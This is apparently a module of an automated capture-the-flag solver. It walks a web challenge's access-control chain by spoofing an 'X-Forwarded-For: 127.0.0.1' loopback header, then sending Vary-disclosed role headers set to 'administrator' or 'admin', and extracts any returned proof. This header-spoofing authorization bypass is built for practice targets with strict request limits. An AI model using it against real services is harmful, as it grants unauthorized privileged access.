#!/usr/bin/env python3
"""GET-only gateway-context / Vary-disclosed role-header trust-boundary reader (B-236).

The Day-30 "Framework Roulette" class (played on Day 31) is a two-layer trust boundary that the target
describes itself, one denial at a time::

    GET feature_route                              -> 403 {"error": "gateway_context_rejected"}
                                                      Vary: X-Forwarded-For
    GET feature_route  X-Forwarded-For: 127.0.0.1  -> 403 {"error": "topology_proof_rejected"}
                                                      Vary: x-arena-<hex>
    GET feature_route  + x-arena-<hex>: <role>     -> 200 {"ok": true, "effect": ..., "evidence": proof}

The reader walks exactly that chain and nothing wider.  It sends nothing until the cached target-local
``/api/clues`` names a query-free ``feature_route`` and the feature route's own denial is a trust-boundary
denial: a 401/403 JSON error whose words name the gateway/proxy/loopback/topology layer, or a ``Vary`` that
names a client-address field.  Each further request is authorised by the previous response:

* the loopback stage sets the client-address field the denial's ``Vary`` named (``X-Forwarded-For`` when the
  denial named none) to ``127.0.0.1``, and continues only when the decision moved (a new error word or a newly
  disclosed header);
* the role stage sets the single application-specific header the latest denial's ``Vary`` disclosed
  (``header_browser_analysis.vary_disclosed_headers``) to a short bounded role ladder: role values the target
  itself names first, then ``administrator`` and ``admin``, then the role a ``<word>_only`` policy names.  The
  caller's own ``current_role`` is never sent.

Only a 2xx JSON answer with an affirmative ``ok``/``effect`` and no error is read, and only a single novel strict
proof (baseline-subtracted against every control, cached page and denial) is returned.  There is no POST, no
redirect, no route guess and no header spray; a contract that changes shape stops the reader.  The caller
supplies the scope-locked WebClient, deadline, request budget and stop event (``proof_hunt`` dispatches it as
the ``gateway-role-header`` peer); target bytes are parsed as bounded duplicate-key-free JSON and never
evaluated.  The shared runner, JSON/cache handling and proof extraction are those of ``delegated_identity``.
"""

from __future__ import annotations

import json
import re
import sys
import time
import urllib.parse
from pathlib import Path


try:
    from ctf import env as ctf_env, paths as ctf_paths
except ModuleNotFoundError:
    import sys as _sys
    from pathlib import Path as _Path
    _sys.path.append(str(_Path(__file__).resolve().parents[2]))
    from ctf import env as ctf_env, paths as ctf_paths

HERE = Path(__file__).resolve().parent
if str(HERE) not in sys.path:
    sys.path.insert(0, str(HERE))

import delegated_identity as _di  # noqa: E402 -- shared runner, transport, cache and JSON policy
import header_browser_analysis as _hba  # noqa: E402 -- offline Vary classification
import post_chain as _shared  # noqa: E402 -- shared proof/carrier policy


DEFAULT_MAX_REQUESTS = 6
DEFAULT_MAX_ROLE_VALUES = 3
MAX_ROLE_VALUES = 4
LOOPBACK_ADDRESS = "127.0.0.1"
DEFAULT_LOOPBACK_HEADER = "X-Forwarded-For"
DEFAULT_ROLE_LADDER = ("administrator", "admin")

# A trust-boundary denial names the layer that made the decision.  Matched on the snake-cased error token.
_TRUST_WORDS = re.compile(
    r"(?:^|_)(?:gateway|proxy|proxied|loopback|localhost|topology|edge|forwarded|forwarding|client|"
    r"network|ingress|upstream|internal|trusted|untrusted|origin_ip|source_ip|ip)(?:_|$)")
# Explicit role fields a target may publish (snake-cased keys), in priority order.
_ROLE_KEYS = ("required_role", "expected_role", "privileged_role", "admin_role", "elevated_role",
              "target_role", "role_required", "required_identity", "privileged_identity")
_POLICY_ROLE = re.compile(r"^([a-z][a-z0-9]{1,31})_only$")
# A loopback field value per disclosed client-address header.
_LOOPBACK_VALUE = {"forwarded": "for=" + LOOPBACK_ADDRESS}


def enabled() -> bool:
    raw = ctf_env.get("CTF_WEB_GATEWAY_ROLE")
    if raw is not None:
        return raw.strip().lower() not in {"off", "0", "false", "no"}
    try:
        return not (ctf_paths.workdir() / "_gateway_role.off").exists()
    except Exception:
        return False


def _vary(response):
    pairs = _di._header_pairs(response)
    if pairs is None:
        return None
    try:
        return _hba.vary_disclosed_headers(pairs)
    except _hba.HeaderAnalysisInputError:
        return None


def denial(response):
    """Classify one trust-boundary denial, or None.

    Returns ``{"error", "trust", "vary", "fields"}`` for a 401/403 coherent JSON response whose ``error`` is a
    word token with no simultaneous affirmative/effect and no payoff-shaped value.  ``trust`` says whether the
    denial itself names the trust layer (its error words or a Vary client-address field).  Pure.
    """
    if _di._status(response) not in (401, 403):
        return None
    fields = _di._normalized_fields(_di._json(response))
    if fields is None:
        return None
    error = _di._snake(fields.get("error"))
    if not error or not _di._clean_control(response):
        return None
    if any(_shared._truthy(fields.get(key)) for key in ("ok", "success", "authorized", "trusted")):
        return None
    if _di._snake(fields.get("effect")):
        return None
    vary = _vary(response)
    if vary is None or vary.malformed or vary.wildcard:
        return None
    trust = bool(_TRUST_WORDS.search(error) or vary.loopback)
    return {"error": error, "trust": trust, "vary": vary, "fields": fields}


def indicated(feature_response) -> bool:
    """Offline gate for a dispatcher: the cached feature-route response is a trust-boundary denial."""
    found = denial(feature_response)
    return bool(found and found["trust"])


def _contract(clues, base_url):
    fields = _di._normalized_fields(clues)
    if fields is None:
        return None
    feature = _di._safe_route(fields.get("feature_route"), base_url)
    if feature is None or feature == "/api/clues":
        return None
    raw_current = fields.get("current_role")
    current = _di._identity(raw_current)
    if raw_current is not None and current is None:
        return None  # a malformed caller identity is ambiguity, not an absent one
    return {"feature": feature, "current": current, "fields": fields}


def _explicit_roles(*documents):
    out = []
    for fields in documents:
        if not isinstance(fields, dict):
            continue
        for key in _ROLE_KEYS:
            value = _di._identity(fields.get(key))
            if value and value not in out:
                out.append(value)
    return out


def _policy_role(fields):
    if not isinstance(fields, dict):
        return None
    match = _POLICY_ROLE.fullmatch(_di._snake(fields.get("policy")))
    if not match:
        return None
    word = match.group(1)
    # a plural group name ("operators_only") names its member role; "class"/"access" keep their "ss"
    if len(word) > 3 and word.endswith("s") and not word.endswith("ss"):
        word = word[:-1]
    return _di._identity(word)


def role_ladder(clue_fields, denial_fields, current=None, limit=DEFAULT_MAX_ROLE_VALUES):
    """The bounded role values for a disclosed role header, most specific first.  Pure."""
    values = _explicit_roles(denial_fields, clue_fields) + list(DEFAULT_ROLE_LADDER)
    policy = _policy_role(denial_fields)
    if policy:
        values.append(policy)
    out = []
    for value in values:
        if value and value != current and value.lower() != str(current or "").lower() and value not in out:
            out.append(value)
    try:
        limit = max(0, min(MAX_ROLE_VALUES, int(limit)))
    except (TypeError, ValueError):
        limit = DEFAULT_MAX_ROLE_VALUES
    return out[:limit]


def _affirmative(response):
    doc = _di._json(response)
    fields = _di._normalized_fields(doc)
    if (_di._status(response) not in range(200, 300) or fields is None or _shared._error(doc)):
        return None
    if not (_shared._truthy(fields.get("ok")) or _di._snake(fields.get("effect"))):
        return None
    return doc


class _Runner(_di._Runner):
    def __init__(self, target, ctx):
        ctx = dict(ctx or {})
        ctx.setdefault("max_requests", DEFAULT_MAX_REQUESTS)
        super().__init__(target, ctx)
        self.role_header = None
        self.role_value = None
        self.loopback_header = None
        self.stages = []
        try:
            self.max_role_values = max(0, min(MAX_ROLE_VALUES, int(
                self.ctx.get("max_role_values", DEFAULT_MAX_ROLE_VALUES))))
        except (TypeError, ValueError):
            self.max_role_values = DEFAULT_MAX_ROLE_VALUES

    def _baseline(self, response):
        if response is not None:
            self.baselines.append(_shared._baseline_text(response))

    def _bank(self, response, doc):
        anchor, siblings = _shared._coherent_json_view(response, doc)
        self.success = True
        self.where = "gateway_role:" + ("role" if self.role_header else "loopback")
        if anchor is None:
            self.stopped = "trusted answer did not occupy one coherent JSON carrier"
            return None
        sibling_candidates = _shared._carrier_candidates(siblings)
        if sibling_candidates:
            self.candidates = sibling_candidates[:12]
            self.stopped = "trusted anchor and proof/candidate occupied different carrier views"
            return None
        synthetic = dict(response)
        synthetic["body"] = anchor.encode("utf-8", "replace")
        synthetic["response_headers"] = {"Content-Type": "application/json"}
        synthetic.pop("response_header_pairs", None)
        synthetic.pop("headers", None)
        info = _shared.extract_anchored(synthetic, self.baselines, anchored=True,
                                        host=urllib.parse.urlsplit(self.url).hostname)
        self.uuid4 = bool(info.get("uuid4"))
        self.candidates = list(info.get("candidates") or [])[:12]
        if info.get("auto") is None:
            self.stopped = "trusted answer carried no single novel strict proof"
        return info.get("auto")

    def _loopback_header(self, step):
        named = [token for token in step["vary"].loopback]
        if len(named) > 1:
            return None
        token = named[0] if named else DEFAULT_LOOPBACK_HEADER.lower()
        name = DEFAULT_LOOPBACK_HEADER if token == DEFAULT_LOOPBACK_HEADER.lower() else token
        return name, _LOOPBACK_VALUE.get(token, LOOPBACK_ADDRESS)

    def run(self):
        if not enabled():
            self.stopped = "off"
            return None
        _clue_response, clues = _di._cached_clues(self.preloaded, self.url)
        contract = _contract(clues, self.url)
        if contract is None:
            self.stopped = "no exact cached gateway contract"
            return None
        feature = contract["feature"]
        if not self._allow_route(feature):
            self.stopped = "caller route policy refused the gateway feature route"
            return None
        cached = _di._cached_response(self.preloaded, feature, self.url)[0]
        # control (unless cached) + one loopback stage + at least one role value
        if self.max_requests - self.requests < (0 if cached else 1) + 2 or not self._may_send():
            self.stopped = self.stopped or "insufficient budget for the gateway chain"
            return None
        if self._client() is None:
            return None

        control = self._control(feature, "gateway-denial-control")
        self._baseline(control)
        step = denial(control)
        if step is None or not step["trust"]:
            self.stopped = self.stopped or "feature denial did not name a gateway trust boundary"
            return None
        self.stages.append(step["error"])
        headers = {}
        if step["vary"].custom and step["vary"].loopback:
            # The first denial already disclosed both layers: keep the loopback field on every role request.
            pair = self._loopback_header(step)
            if pair is None:
                self.stopped = "denial named more than one client-address field"
                return None
            headers[pair[0]] = pair[1]
            self.loopback_header = pair[0]

        if not step["vary"].custom:
            pair = self._loopback_header(step)
            if pair is None:
                self.stopped = "denial named more than one client-address field"
                return None
            headers[pair[0]] = pair[1]
            self.loopback_header = pair[0]
            answer = self.get(feature, "gateway-loopback-stage", headers=dict(headers))
            doc = _affirmative(answer)
            if doc is not None:
                return self._bank(answer, doc)
            self._baseline(answer)
            nxt = denial(answer)
            if nxt is None:
                self.stopped = self.stopped or "loopback stage left the denial contract"
                return None
            moved = nxt["error"] != step["error"] or set(nxt["vary"].custom) - set(step["vary"].custom)
            if not moved:
                self.stopped = "loopback header did not move the gateway decision"
                return None
            self.stages.append(nxt["error"])
            step = nxt

        sent = {name.lower() for name in headers}
        disclosed = [token for token in step["vary"].custom if token not in sent]
        if len(disclosed) != 1:
            self.stopped = ("no Vary-disclosed role header" if not disclosed
                            else "more than one Vary-disclosed role header")
            return None
        self.role_header = disclosed[0]
        ladder = role_ladder(contract["fields"], step["fields"], contract["current"],
                             self.max_role_values)
        if not ladder:
            self.stopped = "no role value to send"
            return None
        for value in ladder:
            answer = self.get(feature, "gateway-role-stage",
                              headers={**headers, self.role_header: value})
            if answer is None:
                return None  # budget, deadline, stop or transport: _Runner.get recorded why
            doc = _affirmative(answer)
            if doc is not None:
                self.role_value = value
                return self._bank(answer, doc)
            self._baseline(answer)
            again = denial(answer)
            if again is None or again["error"] != step["error"]:
                self.stopped = "role stage left the denial contract"
                return None
        self.stopped = self.stopped or "no role value was accepted"
        return None

    def summary(self, proof):
        out = super().summary(proof)
        out.update({"class": "gateway_role", "role_header": self.role_header,
                    "role_value": self.role_value, "loopback_header": self.loopback_header,
                    "stages": list(self.stages)[:4]})
        return out


def _surface(runner, ctx):
    evidence = ctx.get("evidence") if isinstance(ctx, dict) else None
    if not isinstance(evidence, list):
        return
    aid = runner.target.get("answer_id") or "target"
    for value in list(dict.fromkeys(runner.candidates))[:6]:
        line = _di._web.safe_display_text(
            f"WEB GATEWAY-ROLE CANDIDATE {aid}: {value} (trusted-boundary response; not auto-submitted)", 600)
        if line not in evidence:
            evidence.append(line)


def solve(target, ctx=None):
    """Solve one target; never raises and never submits."""
    ctx = dict(ctx or {})
    runner = _Runner(target, ctx)
    proof = None
    try:
        proof = runner.run()
    except Exception as exc:
        runner.stopped = runner.stopped or f"error: {type(exc).__name__}"
    finally:
        runner.stop_now()
    _surface(runner, ctx)
    summary = runner.summary(proof)
    aid = runner.target.get("answer_id") or "target"
    sink = ctx.get("result_sink")
    if isinstance(sink, dict):
        sink[aid] = summary
    _write_log(ctx.get("log_dir"), ctx.get("challenge"), aid, summary)
    return proof


def solve_targets(targets, ctx=None):
    out = {}
    for index, target in enumerate(list(targets or [])):
        if not isinstance(target, dict):
            continue
        item = dict(target)
        aid = str(item.get("answer_id") or item.get("id") or f"target-{index + 1}")
        item["answer_id"] = aid
        out[aid] = solve(item, ctx)
    return out


def _write_log(log_dir, challenge, aid, summary):
    if not log_dir:
        return
    try:
        folder = Path(log_dir)
        folder.mkdir(parents=True, exist_ok=True)
        row = {"at": time.strftime("%Y-%m-%dT%H:%M:%S%z"), "challenge": challenge,
               "answer_id": aid, **summary}
        with (folder / "gateway_role.jsonl").open("a", encoding="utf-8") as handle:
            handle.write(json.dumps(row, separators=(",", ":"), default=str) + "\n")
    except Exception:
        pass
